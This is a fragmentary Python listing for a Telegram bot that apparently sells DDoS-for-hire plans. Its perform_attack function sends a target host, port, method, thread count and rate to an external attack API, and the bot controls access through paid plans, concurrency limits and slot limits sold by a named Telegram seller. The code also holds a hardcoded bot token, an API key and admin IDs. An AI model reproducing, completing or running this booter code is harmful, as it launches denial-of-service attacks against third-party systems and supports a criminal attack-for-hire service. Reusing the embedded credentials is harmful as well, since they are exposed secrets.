...
TOKEN = '6723013427:AAG8miSkG2HYIPHIRi4W6YbDyRCeGKCXAyA' # your bot token here
...
def is_user_authorized(user_id):
    ...
    if info['expiry_date'] < datetime.datetime.now():
        ...
        bot.sendMessage(user_id, 'Your plan has expired. Contact @T9wxn to renew.')
        return False
    return True
...
def perform_attack(target, port, duration, method, threads, rate, reqmethod, geo, user_id):
    info = authorized_users[user_id]
    max_duration = info['max_duration']
    concurrents = info['concurrents']
    user_attack_slots = info.get('attack_slots', 0)
    url = f'https://api.ultimateshop.pw/attack?key= weako96&concurrents=1&host={target}&port={port}&time=60&method={method}&threads={threads}&rate={rate}&reqmethod={reqmethod}&geo={geo}.txt'
    response = requests.get(url)
...
def handle_message(msg):
    ...
    if not is_user_authorized(user_id):
        bot.sendMessage(chat_id, f'You dont have plan. Contact @T9wxn for buying plan.\n\nYour ID: <code>{user_id}</code>', parse_mode='HTML')
        return
...
- /listblacklist - <strong>See all BlackList.</strong>'''
            ...
            message = '<strong>Owner</strong>: @T9wxn\n<strong>Version</strong>: 2.0\nIf you want to buy source. Contact @T9wxn.'
            bot.sendMessage(chat_id, message, parse_mode='HTML')
            ...
            if not is_user_authorized(user_id):
                bot.sendMessage(chat_id, 'You dont have plan. Contact @T9wxnfor buying plan.')
                return
          ...
          states[chat_id] = user_state
            ...
            if not user_state.target:
              ...
              user_attack_slots = info.get('attack_slots', 0)
              if concurrents <= 0:
                bot.sendMessage(chat_id, 'Your concurrents count is zero. Contact @T9wxn to update your plan.')
                del states[chat_id]  
                return
...
if __name__ == '__main__':
    ...
    admin_users = set()
    admin_ids = [6140550037, 456]  # admin user id here
